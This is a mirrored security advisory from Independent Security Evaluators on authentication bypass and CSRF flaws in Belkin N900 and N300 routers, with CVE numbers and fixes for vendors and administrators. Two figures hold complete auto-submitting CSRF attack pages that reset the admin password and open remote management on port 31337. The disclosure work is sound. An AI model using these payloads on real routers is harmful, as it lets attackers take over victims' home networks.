@@ -1,0 +1,725 @@
+<!doctype html>
+<html lang="en">
+
+
+<!-- Mirrored from www.ise.io/research/studies-and-papers/belkin_n900/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 31 Aug 2023 07:29:23 GMT -->
+<head>
+    <title>Belkin N900 and N300 - Independent Security Evaluators - Independent Security Evaluators</title>
+    <meta charset="utf-8">
+	<meta name="description" content="The Belkin N900 (F9K1104v1) and N300 (F7D7301v1) routers are susceptible to authentication bypass attacks.  Any user with access to the web interface can execute administrative commands without providing a username or password.  If remote management is enabled, this includes all users on the WAN.  Administrators who have enabled remote management should disable it immediately." />
+	<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+	<link rel="canonical" href="index.html" />
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="article" />
+	<meta property="og:title" content="Belkin N900 and N300 - Independent Security Evaluators" />
+	<meta property="og:description" content="The Belkin N900 (F9K1104v1) and N300 (F7D7301v1) routers are susceptible to authentication bypass attacks.  Any user with access to the web interface can execute administrative commands without providing a username or password.  If remote management is enabled, this includes all users on the WAN.  Administrators who have enabled remote management should disable it immediately." />
+	<meta property="og:url" content="index.html" />
+	<meta property="og:site_name" content="Independent Security Evaluators" />
+	<meta property="og:image" content="../../../assets/img/logo_white_square.png" />
+	<meta name="twitter:card" content="summary_large_image" />
+
+    <!-- Required meta tags -->
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="ahrefs-site-verification" content="79c692fee3854586781d3f86d234931ba3f5a12705c23db76407351e42aa6757">
+
+    <!-- fonts preload -->
+    <link rel="preload" href="../../../assets/fonts/HK%20Grotesk%20Pro/HKGroteskPro-Regular.woff2" as="font" type="font/woff2" crossorigin/>
+    <link rel="preload" href="../../../assets/fonts/HK%20Grotesk%20Pro/HKGroteskPro-Medium.woff2" as="font" type="font/woff2" crossorigin/>
+
+
+    <!-- Libs CSS -->
+    <link rel="stylesheet" href="../../../assets/fonts/Feather/feather.css">
+    <link rel="stylesheet" href="../../../assets/libs/%40fancyapps/fancybox/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="../../../assets/libs/aos/dist/aos.css">
+
+    <!-- <link rel="stylesheet" type="text/css" href="../../../assets/font-awesome/css/font-awesome.min.css"> -->
+    <link rel="stylesheet" href="../../../../unpkg.com/flickity%402.3.0/dist/flickity.min.css">
+    <script src="../../../../unpkg.com/flickity%402.3.0/dist/flickity.pkgd.min.js"></script>
+    <!-- <link rel="stylesheet" href="../../../assets/libs/choices.js/public/assets/styles/choices.min.css">
+    <link rel="stylesheet" href="../../../assets/libs/flickity-fade/flickity-fade.css">
+    <link rel="stylesheet" href="../../../assets/libs/flickity/dist/flickity.min.css">
+    <link rel="stylesheet" href="../../../assets/libs/highlightjs/styles/vs2015.css">
+    <link rel="stylesheet" href="../../../assets/libs/jarallax/dist/jarallax.css">
+    <link rel="stylesheet" href="../../../assets/libs/quill/dist/quill.core.css" /> -->
+
+
+    <!-- Font awesome animations -->
+    <script src="../../../../kit.fontawesome.com/275cf458c9.js" crossorigin="anonymous"></script> 
+    <link rel="stylesheet" href="../../../../cdnjs.cloudflare.com/ajax/libs/font-awesome-animation/0.3.0/font-awesome-animation.min.css" integrity="sha512-Po8rrCwchD03Wo+2ibHFielZ8luDAVoCyE9i6iFMPyn9+V1tIhGk5wl8iKC9/JfDah5Oe9nV8QzE8HHgjgzp3g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+    <!-- Theme CSS -->
+    <link rel="stylesheet" href="../../../assets/css/theme.min.css">
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-HZ2ZZMHS4S"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-HZ2ZZMHS4S');
+    </script>
+
+    <!-- Google Tag Manager -->
+    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+      new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+      j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+      '../../../../www.googletagmanager.com/gtm5445.html?id='+i+dl;f.parentNode.insertBefore(j,f);
+      })(window,document,'script','dataLayer','GTM-TW7J76M');</script>
+    <!-- End Google Tag Manager -->
+
+    <!-- Google Material Icons -->
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
+</head>
+
+<body>
+    
+    <!-- NAVBAR
+    ================================================== -->
+    <nav class="navbar fixed-top navbar-expand-lg navbar-light bg-white">
+      <div class="container">
+
+        <!-- Brand -->
+        <a class="navbar-brand" href="../../../index.html">
+          <img src="../../../assets/img/brand.svg" class="navbar-brand-img" alt="...">
+        </a>
+
+        <!-- Buttons-->
+        <div>
+          <!-- Start Page Book a Demo Button -->         <!-- Only shows on screen sizes between extra small to medium -->
+          <!--
+          <a class="btn btn-primary btn-sm lift btn-pd-sm d-xs-block d-lg-none" id="navbar-demo-btn" style="display: none;" rel="noopener">
+          Book a Demo</a>-->
+          <!-- Toggler -->
+          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse"
+            aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+          </button>
+        </div>
+
+        <!-- Collapse -->
+        <div class="collapse navbar-collapse" id="navbarCollapse">
+
+          <!-- Toggler -->
+          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse"
+            aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
+            <i class="fe fe-x"></i>
+          </button>
+
+          <!-- Navigation -->
+          <ul class="navbar-nav ml-auto">
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" id="navbarAbout" data-hover="dropdown" href="../../../about/values/index.html" aria-haspopup="true"
+                aria-expanded="false">
+                About
+              </a>
+              <div class="dropdown-menu dropdown-menu" aria-labelledby="navbarAbout">
+                <div class="row no-gutters">
+                  <div class="col-12 col-lg-8">
+
+                    <!-- Heading -->
+                    <h6 class="dropdown-header">
+                      About ISE
+                    </h6>
+
+                    <!-- List -->
+                    <a class="dropdown-item" href="../../../about/values/index.html" title="Integrity, Quality, Dedication, Education">
+                      Company Values
+                    </a>                                
+
+                    <a class="dropdown-item" href="../../../about/methodology/index.html" title="Learn how we deliver reports">
+                      Methodology
+                    </a>      
+
+                    <a class="dropdown-item" href="../../../about/leadership/index.html" title="Independent Security Evaluators">
+                      Leadership
+                    </a>      
+
+                    <a class="dropdown-item" href="../../../news/index.html" title="Stay up to date">
+                      News
+                    </a>      
+
+                    <a class="dropdown-item" href="../../../careers/index.html" title="Join our team">
+                      Careers
+                    </a>      
+
+                  </div>
+                </div>
+              </div>
+            </li>
+
+
+
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" id="navbarServices" data-hover="dropdown" href="../../../services/vulnerability-assessments/index.html" aria-haspopup="true"
+                aria-expanded="false">
+                Services
+              </a>
+              <div class="dropdown-menu dropdown-menu-lg" aria-labelledby="navbarServices">
+                <div class="row no-gutters">
+                  <div class="col-12 col-lg-6">
+
+                    <!-- Heading -->
+                    <h6 class="dropdown-header">
+                      Assessments
+                    </h6>
+
+                    <!-- List -->
+                    <a class="dropdown-item" href="../../../services/vulnerability-assessments/index.html">
+                      Vulnerability Assessments
+                    </a>
+                    <a class="dropdown-item" href="../../../services/application-security-assessment/index.html">
+                      Application Security Assessments
+                    </a>
+                    <a class="dropdown-item" href="../../../services/cloud-security-assessment/index.html">
+                      Cloud Security Assessments
+                    </a>
+                    <a class="dropdown-item" href="../../../services/penetration-testing/index.html">
+                      Penetration Testing
+                    </a>
+                    <a class="dropdown-item" href="../../../services/network-penetration-testing/index.html">
+                      Network Penetration Testing
+                    </a>
+                    <a class="dropdown-item mb-5" href="../../../services/managed-vulnerability-scanning/index.html">
+                      Vulnerability Scanning
+                    </a>
+                
+                    <!-- Heading -->
+                    <h6 class="dropdown-header">
+                      Hacking Events
+                    </h6>
+
+                    <!-- List -->
+                    <a class="dropdown-item mb-5" href="https://www.iotvillage.org/" target="_blank" rel="noopener">
+                      IoT Village <span class="fe fe-external-link"></span>
+                    </a>
+
+                  </div>
+                  <div class="col-12 col-lg-6">
+
+                    <!-- Heading -->
+                    <h6 class="dropdown-header">
+                      Consulting
+                    </h6>
+
+                    <!-- List -->
+                    <a class="dropdown-item" href="../../../services/security-consulting-services/index.html">
+                      Security Consulting
+                    </a>
+                    <a class="dropdown-item" href="../../../services/independent-verification-and-validation/index.html">
+                      Independent Verification & Validation
+                    </a>
+                    <a class="dropdown-item" href="../../../services/secure-design-analysis/index.html">
+                      Secure Design Analysis
+                    </a>
+                    <a class="dropdown-item mb-5" href="../../../services/it-consulting-services/index.html">
+                      IT Consulting
+                    </a>
+                
+                    <!-- Heading -->
+                    <h6 class="dropdown-header">
+                      Training
+                    </h6>
+
+                    <!-- List -->
+                    <a class="dropdown-item" href="../../../services/training/index.html">
+                      Security Training
+                    </a>
+
+                    <a class="dropdown-item mb-5" href="https://offers.ise.io/ise-application-security-training-workshop" rel="noopener noreferrer" target="_blank">
+                      Hackalong <span class="fe fe-external-link"></span>
+                    </a>
+
+                  </div>
+                </div>
+              </div>
+            </li>
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" id="navbarResearch" data-hover="dropdown" href="../../index.html" aria-haspopup="true"
+                aria-expanded="false">
+                Research
+              </a>
+              <div class="dropdown-menu dropdown-menu" aria-labelledby="navbarResearch">
+
+                    <!-- Heading -->
+                    <h6 class="dropdown-header">
+                      Research
+                    </h6>
+
+                    <!-- List -->
+                    <a class="dropdown-item" href="../../index.html" title="Papers & Studies">
+                      Papers & Studies
+                    </a>                                
+
+                    <a class="dropdown-item" href="../../../talks/index.html" title="Talks">
+                      Talks
+                    </a>      
+
+                    <a class="dropdown-item" href="../../../blog/index.html" title="Hackers Blog">
+                      Hackers Blog
+                    </a>      
+
+                    <a class="dropdown-item" href="https://blog.ise.io/blog" title="Industry Blog" rel="noopener noreferrer" target="_blank">
+                      Industry Blog <span class="fe fe-external-link"></span>
+                    </a>      
+
+                    <a class="dropdown-item" href="../../../start/blog/index.html" title="Join our team">
+                      VRM/TPRM Articles
+                    </a>  
+
+                    <a class="dropdown-item" href="../../podcast/index.html" title="Join our team">
+                      Podcast
+                    </a>   
+       
+                </div>
+            </li>
+
+            <!-- Start-->
+            <!-- <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" id="navbarStart" data-hover="dropdown" href="../../../start/" aria-haspopup="true"
+                aria-expanded="false">
+                START VRM
+              </a>
+              <div class="dropdown-menu dropdown-menu-md" aria-labelledby="navbarStart">
+                <div class="list-group list-group-flush p-4">
+
+                  <a class="list-group-item" href="../../../start/blog/">
+                    <div class="ml-4">
+                      <h6 class="font-weight-bold text-uppercase text-primary mb-0">
+                        Blog
+                      </h6>
+                    </div>
+
+                  </a>
+
+                </div>
+              </div>
+            </li> -->
+        
+            <li class="nav-item dropdown">
+              <a class="nav-link" id="navbarStart" href="../../../start/index.html">
+                START - Vendor Risk Management
+              </a>
+            </li>
+
+
+          </ul>
+      
+          <a class="navbar-btn btn btn-sm btn-primary lift ml-auto"
+            href="https://offers.ise.io/ask-an-expert" target="_blank" rel="noopener">
+            Ask an Expert
+          </a>
+
+        </div>
+
+      </div>
+    </nav>
+
+    <!-- CONTENT
+    ================================================== -->
+    
+<!-- WELCOME
+================================================== -->
+<section class="pt-12 pt-md-12 pb-8 border-bottom">
+    <div class="container">
+        <div class="row">
+            <div class="col-12">
+
+				<!-- Headin -->
+				<h1>
+					Taking over the Belkin N900 and N300
+				</h1>
+<div>
+<p><a href="../../../casestudies/exploiting-soho-routers/index.html#summary">[return to summary]</a></p>
+<ul>
+<li><font style="color:red;font-weight:bold;">The N900 and N300 can be trivially taken over by any adversary on the LAN or WLAN.<br />
+</font></li>
+<li><font style="color:red;font-weight:bold;">The N900 and N300 can be taken over by a remote adversary through CSRF attack.<br />
+</font></li>
+<li><font style="color:red;font-weight:bold;">If remote management is enabled (not the default), the N900 and N300 can be trivially taken over by a remote adversary.</font></li>
+</ul>
+<h2>Description</h2>
+<p>The Belkin N900 (F9K1104v1) and N300 (F7D7301v1) routers are susceptible to authentication bypass attacks.  Any user with access to the web interface can execute administrative commands without providing a username or password.  If remote management is enabled, this includes all users on the WAN.  Administrators who have enabled remote management should disable it immediately.</p>
+<p>Even if remote management is not enabled, the Belkin N900 and N300 routers are susceptible to several CSRF attacks, which allow an attacker to forge HTML forms and execute actions on behalf of a legitimate user. ISE created a proof of concept that when executed by any user on the (W)LAN side of these routers (including an attacker who may reside on the (W)LAN), changes the administrator credentials and enables remote management services.</p>
+<h2>Local Attack Requirements</h2>
+<ul>
+<li>An attacker must have access to a machine on the local network, either by physically connecting, or by compromising a machine on the local network through other means (e.g., via malware).</li>
+</ul>
+<h2>Remote Attack Requirements</h2>
+<ul>
+<li>Remote management must be enabled on the router.</li>
+</ul>
+<p>or</p>
+<ul>
+<li>A victim on the (W)LAN must be fooled in to performing an action (e.g., by clicking an attacker provided link), browse to a malicious or compromised site, or be the victim of a man-in-the-middle attack.</li>
+</ul>
+<h2>Details</h2>
+<p>All HTML forms present in the Belkin N900 and N300 are susceptible to Cross-Site Request Forgery.</p>
+<p>The authentication bypass issue has been previously discovered and reported in other models of Belkin routers.</p>
+<ul>
+<li>Vulnerable Firmware is 1.00.06 on the N300.</li>
+<li>Vulnerable Firmware is 1.00.23 on the N900.</li>
+<li>The Belkin web site lists an available firmware update (3.00.05) for the N300, but this update appears to contain a different model number in its file name and was rejected by the router when we attempted to update.</li>
+<li>Other versions of the firmware were not tested.</li>
+</ul>
+<h2>Impact</h2>
+<p>A successful attack exploiting this vulnerability can give a remote adversary full control of the victim router.</p>
+<h2>Recommendations to the vendor</h2>
+<ul>
+<li>Cross-Site request forgery can be prevented by including an unpredictable token in each HTTP request submitted to the web server. At a minimum, these tokens should be unique to each user, but it is recommended that each HTML form delivered contain a unique token.</li>
+<li>In addition to HTML form tokens, HTTP "referer" checking should be enabled.</li>
+<li>Validate HTTP Basic Authentication Header for all HTTP requests.</li>
+<li>Additional information for vendors regarding immediate and long term fixes for these issues can be found on our summary page <a href="../../../casestudies/exploiting-soho-routers/index.html#recommendationsVendors">here</a>. </li>
+</ul>
+<h2>Recommendations to device administrators</h2>
+<ul>
+<li>(4/13/2013) There is not currently an available firmware upgrade that will remedy this vulnerability. </li>
+<li>Take additional preventative measures and precautions by following the steps outlined on our summary page <a href="../../../casestudies/exploiting-soho-routers/index.html#recommendationsAdmin">here</a>.</li>
+</ul>
+<h2>Proof of Concept</h2>
+<p>In the following proof of concept attacks, we assume that our adversary is on the (W)LAN, remote management has been enabled, or a user on the (W)LAN has browsed to a malicious web page.  In either case, since HTTP Basic Authentication is not checked as part of the Belkin's processing of requests, the attacker can directly submit, or submit on behalf of a user via Javascript or CSRF, the attack payloads shown in Figures 1 and 2.  These payloads set the administrator password to the one resulting in the included MD5 hash for the N900 or NULL for the N300, and enable remote management on port 31337.</p>
+<table class="pocHtml" width="500px">
+<tbody>
+<tr>
+<td>
+<pre><code>
+&lt;html&gt;
+
+&lt;head&gt;
+&lt;title&gt;Belkin N900 CSRF - Change Admin Creds. and Enable Remote MGMT.&lt;/title&gt;
+&lt;!--*Discovered by: Jacob Holcomb - 
+	Security Analyst @ Independent Security Evaluators --&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;form name="belkinN900" action="http://192.168.2.1/util_system.html"
+	method="post"/&gt;
+&lt;input type="hidden" name="page" value="util_system"/&gt;
+&lt;input type="hidden" name="sHr" value="00"/&gt;
+&lt;input type="hidden" name="Mm" value="00"/&gt;
+&lt;input type="hidden" name="eHr" value="00"/&gt;
+&lt;input type="hidden" name="eMm" value="00"/&gt;
+&lt;input type="hidden" name="RemoteIP" value="..."/&gt;
+&lt;input type="hidden" name="passwd_md5" value="f370455a8a9c05e5f6ef92c67dc3c9f7"/&gt; 
+	&lt;!--The password must be set as a MD5 hash value. --&gt;
+&lt;input type="hidden" name="do_save_passwd_md5" value="1"/&gt;
+&lt;input type="hidden" name="login_timeout" value="99"/&gt; 
+	&lt;!-- Setting session timeout --&gt;
+&lt;input type="hidden" name="EnableRgmt" value="1"/&gt; 
+	&lt;!-- Enable Remote Management --&gt;
+&lt;input type="hidden" name="checkremote" value="1"/&gt;
+&lt;input type="hidden" name="http_wanport" value="31337"/&gt; 
+	&lt;!-- Set the Remote Management Port --&gt;
+&lt;input type="hidden" name="EnableUPNP" value="1"/&gt;
+&lt;input type="hidden" name="version_eb" value="0"/&gt; 
+&lt;!-- Enable UPnP --&gt;
+&lt;/form&gt;
+
+&lt;script&gt;
+function BeLkIn() {document.belkinN900.submit();}; 
+window.setTimeout(BeLkIn, 0000);
+&lt;/script&gt;
+
+&lt;body&gt;
+&lt;/html&gt;
+</code></pre>
+</td>
+</tr>
+</tbody>
+</table>
+<p><center><font style="font-weight:bold;">Figure 1. Attack page for N900.</font></center></p>
+<table class="pocHtml" width="500px">
+<tbody>
+<tr>
+<td>
+<pre><code>
+&lt;html&gt;
+
+&lt;head&gt;
+&lt;title&gt;Belkin N300 CSRF - Change Admin Creds. and Enable Remote MGMT.&lt;/title&gt;
+&lt;!--*Discovered by: Jacob Holcomb 
+	- Security Analyst @ Independent Security Evaluators --&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;form name="belkinN300" action="http://192.168.2.1/apply.cgi" 
+	method="post"/&gt;
+&lt;input type="hidden" name="location_page" value="system.stm"/&gt;
+&lt;input type="hidden" name="remote_mgmt_enabled" value="1"/&gt;
+&lt;input type="hidden" name="http_passwd" value=""/&gt; 
+	&lt;!--Chaning password to null --&gt;
+&lt;input type="hidden" name="fw_disable" value="0"/&gt; &gt;
+&lt;input type="hidden" name="EnableRgmt" value="on"/&gt; 
+	&lt;!-- Enable Remote Management --&gt;
+&lt;input type="hidden" name="allow_remote_ip" value="0"/&gt; 
+	&lt;!-- Setting session timeout --&gt;
+&lt;input type="hidden" name="http_wanport" value="31337"/&gt; 
+	&lt;!-- Set the Remote Management Port --&gt;
+&lt;input type="hidden" name="arc_action" value="Apply+Changes"/&gt;
+&lt;/form&gt;
+
+&lt;script&gt;
+function BeLkIn300() {document.belkinN300.submit();};
+window.setTimeout(BeLkIn300, 0000);
+&lt;/script&gt;
+
+&lt;body&gt;
+&lt;/html&gt;
+</code></pre>
+</td>
+</tr>
+</tbody>
+</table>
+<p><center><font style="font-weight:bold;">Figure 2. Attack page for N300.</font></center></p>
+<p>At this point, the attacker can remotely administer, and thereby remotely control the N900 or N300.</p>
+<h2>References</h2>
+<ul>
+<li><a href="http://www.exploit-db.com/exploits/18859/">Belkin N150 Wireless Router Password Disclosure</a></li>
+<li><a href="http://www.exploit-db.com/exploits/17349/">Belkin G Wireless Router Admin Exploit</a></li>
+<li><a href="http://www.exploit-db.com/exploits/6305/">Belkin F5D7632-4V6 Authentication Bypass</a></li>
+<li>CVE-2013-3086:  Cross Site Request Forgery (N900)</li>
+<li>CVE-2013-3087:  Cross-Site Scripting (N900)</li>
+<li>CVE-2013-3088:  Authentication Bypass (N900)</li>
+<li>CVE-2013-3089:  Cross Site Request Forgery (N300)</li>
+<li>CVE-2013-3090:  Cross-Site Scripting (N300)</li>
+<li>CVE-2013-3091:  Authentication Bypass (N300)</li>
+<li>CVE-2013-3092:  Failure to Validate HTTP Authorization Header (shared issue)</li>
+</ul>
+<h2>Credit</h2>
+<ul>
+<li>Discovered By: Jacob Holcomb – Security Analyst @ Independent Security Evaluators</li>
+<li>Exploited By: Jacob Holcomb – Security Analyst @ Independent Security Evaluators</li>
+</ul>
+<h2>Contact Information</h2>
+<ul>
+<li>For more information on this particular Belkin hack, you can contact us at routers@www.ise.io</li>
+<li>Alternatively, for more general information on ISE, you can reach us using contact@www.ise.io</li>
+</ul>
+</div>
+
+</div>
+</div>
+</div>
+</section>
+
+
+
+    <!-- SHAPE
+    ================================================== -->
+    <div class="position-relative">
+    <div class="shape shape-bottom shape-fluid-x svg-shim text-gray-200">
+        <svg viewBox="0 0 2880 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M0 48h2880V0h-720C1442.5 52 720 0 720 0H0v48z" fill="currentColor"/></svg>
+    </div>
+    </div>
+
+    <!-- FOOTER
+    ================================================== -->
+    <footer class="py-8 py-md-11 bg-gray-200">
+      <div class="container">
+        <div class="row">
+          <div class="col-12 col-md-2">
+
+            <!-- Brand -->
+            <img src="../../../assets/img/brand-text.svg" alt="..." class="footer-brand img-fluid mb-2">
+
+
+            <!-- Social -->
+            <ul class="list-unstyled list-inline list-social mb-6 mb-md-0">
+              <li class="list-inline-item list-social-item mr-3">
+                <a href="https://www.linkedin.com/company/independent-security-evaluators" class="text-decoration-none" rel="noopener">
+                  <img src="../../../assets/img/icons/social/linkedin.svg" class="list-social-icon" alt="...">
+                </a>
+              </li>
+              <li class="list-inline-item list-social-item mr-3">
+                <a href="https://facebook.com/ISE.infosec" class="text-decoration-none" rel="noopener">
+                  <img src="../../../assets/img/icons/social/facebook.svg" class="list-social-icon" alt="...">
+                </a>
+              </li>
+              <li class="list-inline-item list-social-item mr-3">
+                <a href="https://twitter.com/ISEsecurity" class="text-decoration-none" rel="noopener">
+                  <img src="../../../assets/img/icons/social/twitter.svg" class="list-social-icon" alt="...">
+                </a>
+              </li>
+            </ul>
+
+            <div class="py-4">
+
+              <!-- Heading -->
+              <h6 class="font-weight-bold text-uppercase text-gray-700">
+                <a href="../../../contact/index.html">Contact Us</a>
+              </h6>
+  
+            </div>
+  
+            <div>
+  
+              <!-- Heading -->
+              <h6 class="font-weight-bold text-uppercase text-gray-700">
+                <a href="../../../privacy-policy/index.html">Privacy Policy</a>
+              </h6>
+  
+            </div>
+
+          </div>
+          <div class="col-6 col-md-2">
+
+            <!-- Heading -->
+            <h6 class="font-weight-bold text-uppercase text-gray-700">
+              About
+            </h6>
+
+            <!-- List -->
+            <ul class="list-unstyled text-muted mb-6 mb-md-8 mb-lg-0">
+              <li class="mb-3">
+                <a href="../../../about/values/index.html" class="text-reset">
+                  Company Values
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="../../../about/methodology/index.html" class="text-reset">
+                  Methodology
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="../../../about/leadership/index.html" class="text-reset">
+                  Leadership
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="../../../news/index.html" class="text-reset">
+                  News
+                </a>
+              </li>
+              <li>
+                <a href="../../../careers/index.html" class="text-reset">
+                  Careers
+                </a>
+              </li>
+            </ul>
+
+          </div>
+          <div class="col-6 col-md-2">
+
+            <!-- Heading -->
+            <h6 class="font-weight-bold text-uppercase text-gray-700">
+              Services
+            </h6>
+
+            <!-- List -->
+            <ul class="list-unstyled text-muted mb-6 mb-md-8 mb-lg-0">
+              <li class="mb-3">
+                <a href="../../../services/vulnerability-assessments/index.html" class="text-reset">
+                  Assessments
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="../../../services/security-consulting-services/index.html" class="text-reset">
+                  Consulting
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="https://www.iotvillage.org/" target="_blank" class="text-reset" rel="noopener">
+                  IoT Village <span class="fe fe-external-link"></span>
+                </a>
+              </li>
+              <li">
+                <a href="../../../services/training/index.html" class="text-reset" rel="noopener">
+                  Training
+                </a>
+              </li>
+            </ul>
+
+          </div>
+          <div class="col-6 col-md-2">
+
+            <!-- Heading -->
+            <h6 class="font-weight-bold text-uppercase text-gray-700">
+              Research
+            </h6>
+
+            <!-- List -->
+            <ul class="list-unstyled text-muted mb-0">
+              <li class="mb-3">
+                <a href="../../index.html" class="text-reset">
+                  Studies & Papers
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="../../../talks/index.html" class="text-reset">
+                  Talks
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="../../../blog/index.html" class="text-reset" rel="noopener">
+                  Blog <span class="fe fe-external-link"></span>
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="../../../start/blog/index.html" class="text-reset" rel="noopener">
+                  VRM/TPRM Articles
+                </a>
+
+            </ul>
+
+          </div>
+
+          <div class="col-12 col-md-4">
+            <h6 class="font-weight-bold text-uppercase text-gray-700">
+              Stay up to date on the latest research and industry trends. Sign up for our newsletter
+            </h6>
+            <!-- Heading -->
+            <!--[if lte IE 8]>
+            <script charset="utf-8" type="text/javascript" src="//js.hsforms.net/forms/v2-legacy.js"></script>
+            <![endif]-->
+            <script charset="utf-8" type="text/javascript" src="../../../../js.hsforms.net/forms/v2.js"></script>
+            <script>
+            hbspt.forms.create({
+            region: "na1",
+            portalId: "7197110",
+            formId: "e868052f-9574-4c5b-a8e0-6233b8b6b6d2"
+            });
+            </script>
+
+          </div>
+
+        </div> <!-- / .row -->
+      </div> <!-- / .container -->
+    </footer>
+
+    <!-- JAVASCRIPT
+    ================================================== -->
+    <!-- Libs JS -->
+    <script src="../../../assets/libs/jquery/dist/jquery.min.js"></script>
+    <script src="../../../assets/libs/bootstrap/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="../../../assets/libs/%40fancyapps/fancybox/dist/jquery.fancybox.min.js"></script>
+    <script src="../../../assets/libs/aos/dist/aos.js"></script>
+
+    <!-- <script src="../../../assets/libs/choices.js/public/assets/scripts/choices.min.js"></script> -->
+    <!-- <script src="../../../assets/libs/countup.js/dist/countUp.min.js"></script> -->
+    <!-- <script src="../../../assets/libs/dropzone/dist/min/dropzone.min.js"></script> -->
+    <!-- <script src="../../../assets/libs/flickity/dist/flickity.pkgd.min.js"></script>
+    <script src="../../../assets/libs/flickity-fade/flickity-fade.js"></script>
+    <script src="../../../assets/libs/highlightjs/highlight.pack.min.js"></script> -->
+    <script src="../../../assets/libs/imagesloaded/imagesloaded.pkgd.min.js"></script>
+    <!-- <script src="../../../assets/libs/isotope-layout/dist/isotope.pkgd.min.js"></script> -->
+    <!-- <script src="../../../assets/libs/jarallax/dist/jarallax.min.js"></script> -->
+    <!-- <script src="../../../assets/libs/jarallax/dist/jarallax-video.min.js"></script> -->
+    <!-- <script src="../../../assets/libs/jarallax/dist/jarallax-element.min.js"></script> -->
+    <!-- <script src="../../../assets/libs/quill/dist/quill.min.js"></script> -->
+    <!-- <script src="../../../assets/libs/smooth-scroll/dist/smooth-scroll.min.js"></script> -->
+     <script src="../../../assets/libs/typed.js/lib/typed.min.js"></script>
+
+    <!-- Map -->
+    <!-- <script src='https://api.mapbox.com/mapbox-gl-js/v0.53.0/mapbox-gl.js'></script> -->
+
+    <!-- Theme JS -->
+    <script src="../../../assets/js/theme.min.js"></script>
+
+
+</body>
+
+
+<!-- Mirrored from www.ise.io/research/studies-and-papers/belkin_n900/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 31 Aug 2023 07:29:23 GMT -->
+</html>
